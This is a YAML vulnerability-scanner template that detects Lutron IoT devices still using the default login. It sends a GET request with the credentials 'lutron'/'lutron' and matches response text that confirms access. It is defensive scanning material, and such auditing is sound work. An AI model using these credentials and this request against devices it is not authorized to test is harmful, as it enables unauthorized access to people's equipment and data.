id: lutron-default-login
info:
  author: geeknik
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N
    cvss-score: 5.8
    cwe-id: CWE-522
  description: Multiple Lutron devices contain a default login vulnerability. An attacker
    can obtain access to user accounts and access sensitive information, modify data,
    and/or execute unauthorized operations.
  name: Lutron - Default Login
  reference:
  - https://www.lutron.com
  - https://vulners.com/openvas/OPENVAS:1361412562310113206
  severity: high
  tags: default-login,lutron,iot
requests:
- attack: pitchfork
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - LUTRON
    - DeviceIP
    - Get Database Info as XML
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/login?login={{username}}&password={{password}}'
  payloads:
    password:
    - lutron
    username:
    - lutron
